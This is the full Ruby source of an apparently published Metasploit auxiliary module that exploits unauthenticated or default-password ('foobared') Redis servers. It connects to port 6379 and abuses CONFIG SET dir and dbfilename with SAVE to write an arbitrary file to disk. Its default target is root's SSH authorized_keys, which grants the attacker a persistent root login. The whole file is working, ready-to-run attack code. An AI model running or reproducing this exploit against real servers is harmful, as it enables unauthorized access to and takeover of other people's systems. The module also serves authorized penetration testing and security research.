##
# This module requires Metasploit: http://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'msf/core'

class Metasploit3 < Msf::Auxiliary

  include Msf::Exploit::Remote::Tcp
  include Msf::Auxiliary::Scanner
  include Msf::Auxiliary::Report

  def initialize(info = {})
    super(update_info(info,
      'Name'          => 'Redis Unauthenticated File Upload',
      'Description'   => %q(
        This module can save data to file in remote redis server,
        Because redis is unprotected without a password set up.
      ),
      'License'       => MSF_LICENSE,
      'Author'        => ['Nixawk'],
      'References'    => [
        ['URL', 'http://antirez.com/news/96'],
        ['URL', 'http://blog.knownsec.com/2015/11/analysis-of-redis-unauthorized-of-expolit/'],
        ['URL', 'http://redis.io/topics/protocol']
      ]
      ))
    register_options(
      [
        Opt::RPORT(6379),
        OptPath.new('LocalFile', [true, 'Local file to be uploaded', '/root/.ssh/id_rsa.pub']),
        OptString.new('RemoteFile', [true, 'Remote file path', '/root/.ssh/authorized_keys']),
        OptString.new('AUTH_KEY', [false, 'Password for redis authentication', 'foobared'])
      ], self.class)

    register_advanced_options(
      [
        OptInt.new('READ_TIMEOUT', [true, 'Seconds to wait while reading redis responses', 2])
      ], self.class)
  end

  def read_timeout
    datastore['READ_TIMEOUT']
  end

  def peer
    "#{rhost}:#{rport}"
  end

  def redis_proto(parts)
    return if parts.blank?
    command = "*#{parts.length}\r\n"
    parts.each do |p|
      command << "$#{p.length}\r\n#{p}\r\n"
    end
    command
  end

  def send_command(command)
    command = redis_proto(command)
    sock.put(command)
    sock.get_once(-1, read_timeout)
  end

  def auth?(password)
    report_service(
      host: rhost,
      port: rport,
      name: 'redis',
      proto: 'tcp'
    )

    command = ['AUTH', "#{password}"]
    data = send_command(command)
    vprint_status("#{peer} - REDIS Command: #{command.join(' ').dump} - #{data.chop}")
    if data && data.include?('+OK')
      true
    else
      false
    end
  end

  def send_file(path, content)
    report_service(
      host: rhost,
      port: rport,
      name: 'redis',
      proto: 'tcp'
    )

    dirname = File.dirname(path)
    basename = File.basename(path)

    key = Rex::Text.rand_text_alpha(32)
    command = ['CONFIG', 'SET', 'DIR', "#{dirname}"]
    data = send_command(command)
    vprint_status("#{peer} - REDIS Command: #{command.join(' ').dump} - #{data.chop}")
    return unless data.include?('+OK')

    command = ['CONFIG', 'SET', 'dbfilename', "#{basename}"]
    data = send_command(command)
    vprint_status("#{peer} - REDIS Command: #{command.join(' ').dump} - #{data.chop}")
    return unless data.include?('+OK')

    command = ['SET', "#{key}", "#{content}"]
    data = send_command(command)
    vprint_status("#{peer} - REDIS Command: #{command.join(' ').dump} - #{data.chop}")
    return unless data.include?('+OK')
    print_good("#{rhost}:#{rport}: save file to #{path}")
    report_note(
      type: 'redis_unauth_file_upload',
      host: rhost,
      port: rport,
      proto: 'tcp',
      data: "Save it to #{path} on remote server successfully",
    )

    command = ['SAVE']
    data = send_command(command)
    vprint_status("#{peer} - REDIS Command: #{command.join(' ').dump} - #{data.chop}")
    return unless data.include?('+OK')

    command = ['DEL', "#{key}"]
    data = send_command(command)
    vprint_status("#{peer} - REDIS Command: #{command.join(' ').dump} - #{data.chop}")
    return unless data.include?('+OK')
  end

  def run_host(ip)
    begin
      connect
      res = send_command(['PING'])
      print_status("#{peer} - No Response") unless res

      if res =~ /PONG/
        content = "\n\n#{File.open(datastore['LocalFile']).read}\n\n\n"
        send_file(datastore['RemoteFile'], content)
      elsif res =~ /NOAUTH Authentication required/
        if auth?(datastore['AUTH_KEY'])
          content = "\n\n#{File.open(datastore['LocalFile']).read}\n\n\n"
          send_file(datastore['RemoteFile'], content)
        end
      end

    rescue ::Exception => e
      print_error("#{e}")
    ensure
      disconnect
    end
  end
end
